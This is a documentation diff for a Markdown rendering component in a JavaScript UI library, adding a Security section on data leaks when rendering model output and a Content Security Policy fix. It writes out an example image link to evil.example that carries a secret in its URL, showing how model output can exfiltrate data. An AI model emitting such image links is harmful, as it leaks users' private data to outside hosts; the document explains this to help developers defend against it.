@@ -92,6 +92,24 @@ Other `div` attributes pass to the root. Not supported: reference links, footnot
 
 ::api{symbol="@rivetjs/ui/markdown#MarkdownProps"}
 
+## Security
+
+`Markdown` drops raw HTML and unsafe URLs, and images send no referrer. It still loads every `http(s)` image the text names, so rendering model output has one risk to close: `![x](https://evil.example/log?d=<secret>)` sends whatever the model put in that URL to that host, without a click. This matters when the model can see data the reader should not leak, such as other documents or tool results.
+
+Close it in your app with a Content Security Policy listing the image hosts you trust. Rivet's default policy covers scripts only and sets no `img-src`.
+
+```ts
+start({
+  csp: {
+    directives: {
+      "img-src": ["'self'", "data:", "https://images.example.com"],
+    },
+  },
+});
+```
+
+`createApp({ csp: { directives } })` takes the same option. Keep `data:` if the page uses `Picture` placeholders. To decide per image instead, override `img` in `components`. See the [CSP guide](https://rivetjs.severyn.pro/guides/security/csp/).
+
 ## Accessibility
 
 headings, lists, tables and quotes are their native elements; images keep their alt text and send no referrer (`referrerpolicy="no-referrer"`: an image URL in model output cannot learn the page address); task-list checkboxes are read-only.
